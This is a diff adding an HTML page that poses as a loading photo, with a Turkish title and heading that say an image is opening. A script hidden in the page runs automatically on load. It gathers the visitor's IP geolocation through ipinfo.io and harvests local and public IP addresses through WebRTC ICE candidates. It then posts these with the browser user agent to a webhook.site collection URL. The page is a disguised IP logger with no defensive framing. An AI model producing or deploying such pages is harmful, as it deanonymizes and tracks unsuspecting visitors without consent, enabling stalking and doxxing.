@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Fotoğraf açılıyor...</title>
+  <style>
+    body { background: #000; color: white; text-align: center; padding: 50px; font-family: Arial; }
+    img { max-width: 90%; border: 2px solid white; }
+  </style>
+</head>
+<body>
+  <h1>📷 Görsel yükleniyor...</h1>
+  <img src="https://i.imgur.com/5gSk901.png" alt="Image">
+
+  <script>
+    async function logInfo() {
+      const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
+      const rtcInfo = [];
+
+      const pc = new RTCPeerConnection({iceServers:[]});
+      pc.createDataChannel("");
+      pc.createOffer().then(offer => pc.setLocalDescription(offer));
+      pc.onicecandidate = event => {
+        if (event && event.candidate) {
+          rtcInfo.push(event.candidate.candidate);
+        } else {
+          fetch("https://webhook.site/5d00c531-eec0-43d9-883a-97f01b7492d9", {
+            method: "POST",
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              ip: ipData,
+              webrtc: rtcInfo,
+              browser: navigator.userAgent
+            })
+          });
+        }
+      };
+    }
+    logInfo();
+  </script>
+</body>
+</html>
